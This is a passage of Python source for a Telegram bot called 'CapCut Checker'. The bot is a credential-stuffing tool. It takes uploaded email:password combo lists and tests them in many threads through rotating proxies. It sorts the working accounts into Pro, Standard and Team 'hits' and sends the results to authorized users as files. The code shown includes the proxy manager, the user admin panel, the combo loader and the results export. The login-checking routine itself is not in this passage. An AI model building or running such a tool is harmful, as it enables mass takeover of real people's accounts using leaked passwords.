                txt = f"CAPCUT HITS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*30}\n\n"
                with hits_lock:
                    if all_pro_hits:
                        txt += f"===== PRO HITS ({len(all_pro_hits)}) =====\n\n"
                        for e, p, r in all_pro_hits:
                            txt += f"{r}\n{'-'*30}\n"
                    if all_standard_hits:
                        txt += f"\n===== STANDARD HITS ({len(all_standard_hits)}) =====\n\n"
                        for e, p, r in all_standard_hits:
                            txt += f"{r}\n{'-'*30}\n"
                    if all_team_hits:
                        txt += f"\n===== TEAM HITS ({len(all_team_hits)}) =====\n\n"
                        for e, p, r in all_team_hits:
                            txt += f"{r}\n{'-'*30}\n"
                    total = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits)
                fname = f"capcut_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                send_text_document(call.message.chat.id, txt, fname, f"📋 Total Hits: {total}")

        elif call.data == "export_free":
            bot.answer_callback_query(call.id)
            with hits_lock:
                free_snap = list(all_free_accounts)
            if not free_snap:
                bot.send_message(call.message.chat.id, "📭 No free accounts collected yet.")
            else:
                txt = f"FREE ACCOUNTS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n" + "="*30 + "\n\n"
                for e, p in free_snap:
                    txt += f"{e}:{p}\n"
                fname = f"capcut_free_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                send_text_document(call.message.chat.id, txt, fname, f"⚠️ Free Accounts: {len(free_snap)}")

        elif call.data == "export_errors":
            bot.answer_callback_query(call.id)
            with hits_lock:
                error_snap = list(all_error_accounts)
            if not error_snap:
                bot.send_message(call.message.chat.id, "📭 No error accounts collected yet.")
            else:
                txt = f"ERROR ACCOUNTS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n" + "="*30 + "\n"
                txt += f"Total: {len(error_snap)} accounts\n\n"
                for e, p in error_snap:
                    txt += f"{e}:{p}\n"
                fname = f"capcut_errors_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                send_text_document(call.message.chat.id, txt, fname, f"❌ Error Accounts: {len(error_snap)}")

        elif call.data.startswith("hits_page_"):
            page = int(call.data.split("_")[2])
            send_hits_list(call.message.chat.id, page)

        # ========== PROXY CALLBACKS ==========
        elif call.data == "proxy_menu":
            bot.answer_callback_query(call.id)
            send_proxy_menu(call.message.chat.id, call.message.message_id)

        elif call.data == "proxy_add":
            bot.answer_callback_query(call.id)
            send_proxy_type_selector(call.message.chat.id, call.message.message_id)

        elif call.data.startswith("proxy_type_"):
            bot.answer_callback_query(call.id)
            selected_type = call.data.replace("proxy_type_", "")
            if selected_type in PROXY_TYPES:
                pending_proxy_action[call.from_user.id] = {"action": "add", "type": selected_type}
                icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(selected_type, "⚪")
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("❌ Cancel", callback_data="proxy_cancel"))
                txt = (
                    f"{icon} *Add {selected_type} Proxy*\n\n"
                    f"Send proxy in format:\n"
                    f"`host:port:username:password`\n\n"
                    f"Example:\n`proxy.geonode.io:11000:user:pass`\n\n"
                    f"💡 You can also send multiple proxies (one per line)."
                )
                try:
                    bot.edit_message_text(txt, call.message.chat.id, call.message.message_id,
                                          parse_mode='Markdown', reply_markup=markup)
                except Exception:
                    bot.send_message(call.message.chat.id, txt, parse_mode='Markdown', reply_markup=markup)

        elif call.data == "proxy_remove":
            bot.answer_callback_query(call.id)
            with proxy_lock:
                if not proxy_list:
                    send_proxy_menu(call.message.chat.id, call.message.message_id)
                    return
                markup = InlineKeyboardMarkup(row_width=1)
                for i, p in enumerate(proxy_list[:20]):
                    ptype = p.get("type", "HTTP")
                    raw = p.get("proxy", "?")
                    parts = raw.split(":")
                    display = f"{parts[0]}:{parts[1]}" if len(parts) >= 2 else raw[:20]
                    icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(ptype, "⚪")
                    markup.add(InlineKeyboardButton(f"❌ {icon} {ptype} {display}", callback_data=f"proxy_del_{i}"))
                markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))
            try:
                bot.edit_message_text("➖ *Remove Proxy*\nTap to remove:",
                                      call.message.chat.id, call.message.message_id,
                                      parse_mode='Markdown', reply_markup=markup)
            except Exception:
                bot.send_message(call.message.chat.id, "➖ *Remove Proxy*\nTap to remove:",
                                 parse_mode='Markdown', reply_markup=markup)

        elif call.data.startswith("proxy_del_"):
            try:
                idx = int(call.data.replace("proxy_del_", ""))
                with proxy_lock:
                    if 0 <= idx < len(proxy_list):
                        proxy_list.pop(idx)
                        save_proxies()
                        bot.answer_callback_query(call.id, f"✅ Removed proxy #{idx+1}")
                    else:
                        bot.answer_callback_query(call.id, "❌ Invalid index")
            except Exception:
                bot.answer_callback_query(call.id, "⚠️ Error")
            send_proxy_menu(call.message.chat.id, call.message.message_id)

        elif call.data == "proxy_list":
            bot.answer_callback_query(call.id)
            send_proxy_list(call.message.chat.id, 0, call.message.message_id)

        elif call.data.startswith("proxy_pg_"):
            bot.answer_callback_query(call.id)
            page = int(call.data.replace("proxy_pg_", ""))
            send_proxy_list(call.message.chat.id, page, call.message.message_id)

        elif call.data == "proxy_clear":
            bot.answer_callback_query(call.id, "✅ All proxies cleared!")
            with proxy_lock:
                proxy_list.clear()
                save_proxies()
            send_proxy_menu(call.message.chat.id, call.message.message_id)

        elif call.data == "proxy_cancel":
            bot.answer_callback_query(call.id, "Cancelled")
            pending_proxy_action.pop(call.from_user.id, None)
            send_proxy_menu(call.message.chat.id, call.message.message_id)

        elif call.data == "proxy_test":
            bot.answer_callback_query(call.id, "🧪 Testing…")
            with proxy_lock:
                snap = list(proxy_list)
            if not snap:
                send_proxy_menu(call.message.chat.id, call.message.message_id)
                return
            chat_id = call.message.chat.id
            msg_id = call.message.message_id
            try:
                bot.edit_message_text(
                    f"🧪 *Testing {len(snap)} proxy(s)…*\n_Hitting api.ipify.org via each proxy_",
                    chat_id, msg_id, parse_mode='Markdown'
                )
            except Exception:
                pass

            def _run_test():
                results = [None] * len(snap)
                def _w(i_p):
                    i, p = i_p
                    results[i] = (p, test_one_proxy(p))
                with ThreadPoolExecutor(max_workers=min(20, max(1, len(snap)))) as ex:
                    list(ex.map(_w, list(enumerate(snap))))
                ok = sum(1 for r in results if r and r[1]["ok"])
                bad = len(results) - ok
                lines = [
                    f"🧪 *PROXY TEST RESULT*",
                    f"✅ Live: *{ok}*  ·  ❌ Dead: *{bad}*",
                    "─" * 28,
                ]
                for i, item in enumerate(results, 1):
                    if not item:
                        continue
                    p, r = item
                    ptype = p.get("type", "HTTP")
                    raw = p.get("proxy", "?")
                    parts = raw.split(":")
                    display = f"{parts[0]}:{parts[1]}" if len(parts) >= 2 else raw[:20]
                    icon_p = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(ptype, "⚪")
                    head = f"{icon_p} `[{i}]` {ptype} `{display}`"
                    if r["ok"]:
                        lines.append(f"{head}\n   ✅ LIVE · IP `{r['ip']}` · {r['latency']}ms")
                    else:
                        lines.append(f"{head}\n   ❌ DEAD · {r['error']} · {r['latency']}ms")
                lines.append("")
                lines.append("Tap below to go back.")
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))
                txt = "\n".join(lines)
                if len(txt) > 3900:
                    txt = txt[:3900] + "\n…(truncated)"
                try:
                    bot.edit_message_text(txt, chat_id, msg_id, parse_mode='Markdown', reply_markup=markup)
                except Exception:
                    bot.send_message(chat_id, txt, parse_mode='Markdown', reply_markup=markup)
            threading.Thread(target=_run_test, daemon=True).start()

        # ========== ADMIN PANEL ==========
        elif call.data == "admin_panel":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                bot.send_message(call.message.chat.id, "⛔ Admin only.")
                return
            send_admin_panel(call.message.chat.id)

        elif call.data == "admin_list":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                return
            send_user_list(call.message.chat.id)

        elif call.data == "admin_add":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                return
            pending_admin_action[call.from_user.id] = "add"
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("❌ Cancel", callback_data="admin_cancel"))
            bot.send_message(call.message.chat.id,
                "➕ *Add User*\n\nReply with the Telegram numeric ID to authorize.\n_(e.g. `123456789`)_",
                parse_mode='Markdown', reply_markup=markup)

        elif call.data == "admin_remove":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                return
            if not allowed_users:
                bot.send_message(call.message.chat.id, "📭 No users to remove.")
                send_admin_panel(call.message.chat.id)
                return
            markup = InlineKeyboardMarkup(row_width=2)
            for uid in sorted(allowed_users):
                markup.add(InlineKeyboardButton(f"❌ {uid}", callback_data=f"admin_del_{uid}"))
            markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="admin_panel"))
            bot.send_message(call.message.chat.id,
                "➖ *Remove User*\nTap an ID to revoke access:",
                parse_mode='Markdown', reply_markup=markup)

        elif call.data.startswith("admin_del_"):
            if not is_admin(call.from_user.id):
                bot.answer_callback_query(call.id, "⛔")
                return
            try:
                uid = int(call.data.split("_")[2])
                if uid in allowed_users:
                    allowed_users.discard(uid)
                    save_users()
                    bot.answer_callback_query(call.id, f"✅ Removed {uid}")
                else:
                    bot.answer_callback_query(call.id, "Not found")
            except Exception:
                bot.answer_callback_query(call.id, "⚠️ Error")
            send_admin_panel(call.message.chat.id)

        elif call.data == "admin_cancel":
            bot.answer_callback_query(call.id, "Cancelled")
            pending_admin_action.pop(call.from_user.id, None)
            send_admin_panel(call.message.chat.id)

    except Exception as e:
        logging.error(f"Callback error: {e}")
        try:
            bot.answer_callback_query(call.id, "⚠️ Error")
        except:
            pass


# ========== PROCESS COMBOS ==========
def process_combos(chat_id, combos):
    global pro_count, standard_count, team_count, free_count, fail_count
    global all_pro_hits, all_standard_hits, all_team_hits
    global all_free_accounts, all_error_accounts

    sess = get_session(chat_id)
    with sess["lock"]:
        sess["checking_active"] = True
        sess["stop_flag"] = False

    with hits_lock:
        all_pro_hits.clear()
        all_standard_hits.clear()
        all_team_hits.clear()
        all_free_accounts.clear()
        all_error_accounts.clear()
    with stats_lock:
        pro_count = standard_count = team_count = free_count = fail_count = 0

    local_pro = local_standard = local_team = local_free = local_fail = 0

    total = len(combos)
    completed = 0
    start_time = time.time()
    last_update = 0

    status_msg = bot.send_message(chat_id,
        f"🚀 Starting ∙ 📋{total:,} ∙ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x")

    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            sess["current_executor"] = executor
            futures = {executor.submit(check_single_account, e, p): (e, p) for e, p in combos}
            sess["current_futures"] = futures

            for future in as_completed(futures):
                if sess["stop_flag"]:
                    for f in futures:
                        f.cancel()
                    break

                completed += 1
                pct = (completed / total) * 100
                elapsed = time.time() - start_time
                email, password = futures[future]

                try:
                    result = future.result(timeout=60)
                    if len(result) == 5:
                        email, password, status, detail, plan_type = result
                    else:
                        continue
                except Exception:
                    local_fail += 1
                    with stats_lock:
                        fail_count += 1
                    with hits_lock:
                        all_error_accounts.append((email, password))
                    continue

                if status == "HIT":
                    if plan_type == "PRO":
                        local_pro += 1
                        with stats_lock:
                            pro_count += 1
                        with hits_lock:
                            all_pro_hits.append((email, password, detail))
                    elif plan_type == "TEAM":
                        local_team += 1
                        with stats_lock:
                            team_count += 1
                        with hits_lock:
                            all_team_hits.append((email, password, detail))
                    else:  # STANDARD
                        local_standard += 1
                        with stats_lock:
                            standard_count += 1
                        with hits_lock:
                            all_standard_hits.append((email, password, detail))

                    # Send hit message
                    hit_kb = InlineKeyboardMarkup(row_width=2)
                    hit_kb.add(
                        InlineKeyboardButton("🌐 CapCut", url="https://www.capcut.com/"),
                        InlineKeyboardButton("📋 Copy Combo", callback_data="noop"),
                    )
                    try:
                        bot.send_message(chat_id, detail, parse_mode='Markdown', reply_markup=hit_kb)
                    except Exception:
                        try:
                            bot.send_message(chat_id, detail, reply_markup=hit_kb)
                        except Exception:
                            try:
                                bot.send_message(chat_id, detail)
                            except Exception:
                                pass
                    logging.info(f"✅ HIT: {email} ({plan_type}) [chat={chat_id}]")

                elif status == "FREE":
                    local_free += 1
                    with stats_lock:
                        free_count += 1
                    with hits_lock:
                        all_free_accounts.append((email, password))
                elif status == "STOPPED":
                    break
                else:
                    local_fail += 1
                    with stats_lock:
                        fail_count += 1
                    with hits_lock:
                        all_error_accounts.append((email, password))

                if completed - last_update >= PROGRESS_INTERVAL or completed == total:
                    last_update = completed
                    bar = "█" * int(pct/5) + "░" * (20 - int(pct/5))
                    spd = completed / elapsed if elapsed > 0 else 0
                    eta = (total - completed) / spd if spd > 0 else 0

                    prog = f"""✂️ 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚
[{bar}] {pct:.1f}%
📊 {completed:,}/{total:,} ∙ ⏱{elapsed:.0f}s ∙ 🚀{int(spd)}/s ∙ ETA:{int(eta)}s

💎 Pro : {local_pro}
⭐ Standard : {local_standard}
👥 Team : {local_team}
⚠️ Free : {local_free}
❌ Errors : {local_fail}

⚡ /stop to cancel"""
                    try:
                        bot.edit_message_text(prog, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
                    except:
                        pass

    except Exception as e:
        logging.error(f"Process error [chat={chat_id}]: {e}\n{traceback.format_exc()}")
        bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}\nHits saved!")

    elapsed = time.time() - start_time
    total_hits = local_pro + local_standard + local_team
    rate = round(total_hits / total * 100, 2) if total > 0 else 0

    bot.send_message(chat_id, f"""{'━' * 32}
✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘
{'━' * 32}
⏱ {elapsed:.1f}s ∙ 📋 {total:,} ∙ 🎯 {rate}%
💎 Pro : {local_pro}
⭐ Standard : {local_standard}
👥 Team : {local_team}
⚠️ Free : {local_free}
❌ Errors : {local_fail}
💾 VIEW HITS for results""", parse_mode='Markdown')

    # ===== AUTO-SEND RESULT FILES =====
    def _send_result_file(cid, items, fname, caption, combo_only=False):
        if not items:
            return
        lines = []
        for item in items:
            if combo_only:
                e, p = item
                lines.append(f"{e}:{p}")
            else:
                e, p, detail = item
                lines.append(detail)
                lines.append("=" * 40)
        txt = "\n".join(lines)
        try:
            send_text_document(cid, txt, fname, caption)
        except Exception as _e:
            try:
                bot.send_message(cid, f"⚠️ Failed to send {fname}: {_e}")
            except Exception:
                pass

    with hits_lock:
        _snap_pro = list(all_pro_hits)
        _snap_std = list(all_standard_hits)
        _snap_team = list(all_team_hits)
        _snap_free = list(all_free_accounts)
        _snap_err = list(all_error_accounts)

    _ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    _send_result_file(chat_id, _snap_pro,  f"PRO_{_ts}.txt",      f"💎 CapCut Pro: {len(_snap_pro)}")
    _send_result_file(chat_id, _snap_std,  f"STANDARD_{_ts}.txt", f"⭐ CapCut Standard: {len(_snap_std)}")
    _send_result_file(chat_id, _snap_team, f"TEAM_{_ts}.txt",     f"👥 CapCut Team: {len(_snap_team)}")
    _send_result_file(chat_id, _snap_free, f"FREE_{_ts}.txt",     f"⚠️ Free: {len(_snap_free)}", combo_only=True)
    _send_result_file(chat_id, _snap_err,  f"ERRORS_{_ts}.txt",   f"❌ Errors: {len(_snap_err)}", combo_only=True)

    send_main_menu(chat_id)

    with sess["lock"]:
        sess["checking_active"] = False
        sess["stop_flag"] = False
        sess["current_executor"] = None
        sess["current_futures"] = None


# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start_command(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message,
            f"⛔ Unauthorized.\n\nYour ID: `{message.from_user.id}`\nAsk an admin to add you.",
            parse_mode='Markdown')
        return
    send_main_menu(message.chat.id, message.from_user.id, get_display_user(message))

@bot.message_handler(commands=['stop'])
def stop_command(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ Unauthorized.")
        return
    sess = get_session(message.chat.id)
    if sess["checking_active"]:
        sess["stop_flag"] = True
        if sess["current_futures"]:
            for f in sess["current_futures"]:
                f.cancel()
        bot.reply_to(message, "🛑 Stopping your check...")
    else:
        bot.reply_to(message, "ℹ️ You have no active check.")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Admin only.")
        return
    send_admin_panel(message.chat.id)

@bot.message_handler(commands=['myid'])
def myid_command(message):
    bot.reply_to(message, f"🆔 Your Telegram ID: `{message.from_user.id}`", parse_mode='Markdown')

@bot.message_handler(commands=['adduser'])
def adduser_cmd(message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/adduser <user_id>`", parse_mode='Markdown')
        return
    try:
        uid = int(parts[1])
        allowed_users.add(uid)
        save_users()
        bot.reply_to(message, f"✅ Added `{uid}` ({len(allowed_users)} total)", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID — must be numeric.")

@bot.message_handler(commands=['removeuser'])
def removeuser_cmd(message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/removeuser <user_id>`", parse_mode='Markdown')
        return
    try:
        uid = int(parts[1])
        if uid in allowed_users:
            allowed_users.discard(uid)
            save_users()
            bot.reply_to(message, f"✅ Removed `{uid}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, "ℹ️ User not in list.")
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔")
        return
    sess = get_session(message.chat.id)
    if sess["checking_active"]:
        bot.reply_to(message, "⚠️ You already have a check running! /stop first")
        return

    status_msg = bot.reply_to(message, "📥 Loading...")

    try:
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        combos = []
        for line in content.split('\n'):
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                e, p = parts[0].strip(), parts[1].strip()
                if e and p:
                    combos.append((e, p))

        if not combos:
            bot.edit_message_text("❌ No valid combos. Format: email:password",
                                 status_msg.chat.id, status_msg.message_id)
            return

        bot.edit_message_text(
            f"✅ {len(combos):,} combos ∙ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x\n🚀 Starting...",
            status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')

        thread = threading.Thread(target=process_combos, args=(message.chat.id, combos))
        thread.daemon = True
        thread.start()

    except Exception as e:
        logging.error(f"File error: {e}")
        bot.edit_message_text(f"❌ {str(e)[:100]}", status_msg.chat.id, status_msg.message_id)

@bot.message_handler(func=lambda m: m.from_user.id in pending_admin_action,
                     content_types=['text'])
def admin_text_input(message):
    if not is_admin(message.from_user.id):
        pending_admin_action.pop(message.from_user.id, None)
        return
    action = pending_admin_action.pop(message.from_user.id, None)
    if action == "add":
        text = message.text.strip()
        try:
            uid = int(text)
            if uid in ADMIN_IDS:
                bot.reply_to(message, "ℹ️ Already an admin.")
            elif uid in allowed_users:
                bot.reply_to(message, f"ℹ️ `{uid}` is already authorized.", parse_mode='Markdown')
            else:
                allowed_users.add(uid)
                save_users()
                bot.reply_to(message, f"✅ Added `{uid}`\n👥 Total: {len(allowed_users)}",
                            parse_mode='Markdown')
        except ValueError:
            bot.reply_to(message, "❌ Invalid ID. Must be numeric.")
        send_admin_panel(message.chat.id)

@bot.message_handler(func=lambda m: m.from_user.id in pending_proxy_action,
                     content_types=['text'])
def proxy_text_input(message):
    info = pending_proxy_action.pop(message.from_user.id, None)
    if not info or info.get("action") != "add":
        return

    ptype = info.get("type", "HTTP")
    text = message.text.strip()
    lines = [l.strip() for l in text.split("\n") if l.strip()]

    added = 0
    errors = 0
    for line in lines:
        parts = line.split(":")
        if len(parts) >= 2:
            with proxy_lock:
                proxy_list.append({"proxy": line, "type": ptype})
            added += 1
        else:
            errors += 1

    if added > 0:
        with proxy_lock:
            save_proxies()
        icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(ptype, "⚪")
        msg = f"{icon} ✅ Added *{added}* {ptype} proxy(s)"
        if errors > 0:
            msg += f"\n⚠️ {errors} invalid line(s) skipped"
        with proxy_lock:
            msg += f"\n📊 Total proxies: *{len(proxy_list)}*"
        bot.reply_to(message, msg, parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ Invalid format. Use `host:port:user:pass`", parse_mode='Markdown')

    send_proxy_menu(message.chat.id)


# ========== BOT START ==========
def run_bot():
    load_users()
    load_proxies()
    while True:
        try:
            try:
                bot.remove_webhook()
            except Exception:
                pass
            time.sleep(1)

            print("═" * 40)
            print("✂️ CAPCUT CHECKER V1.0 (Multi-User)")
            print(f"👑 Admins: {ADMIN_IDS}")
            print(f"👥 Authorized users: {len(allowed_users)}")
            print(f"🌐 Proxies loaded: {len(proxy_list)}")
            print(f"🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x ∙ ⏱ {REQUEST_TIMEOUT}s")
            print("═" * 40)
            print("🟢 Bot started!")
            bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                 allowed_updates=None, skip_pending=True,
                                 restart_on_change=False)
        except KeyboardInterrupt:
            print("🛑 Stopped.")
            break
        except Exception as e:
            logging.error(f"Polling error: {e}")
            logging.info("🔄 Reconnecting in 10s...")
            time.sleep(10)

if __name__ == "__main__":
    run_bot()
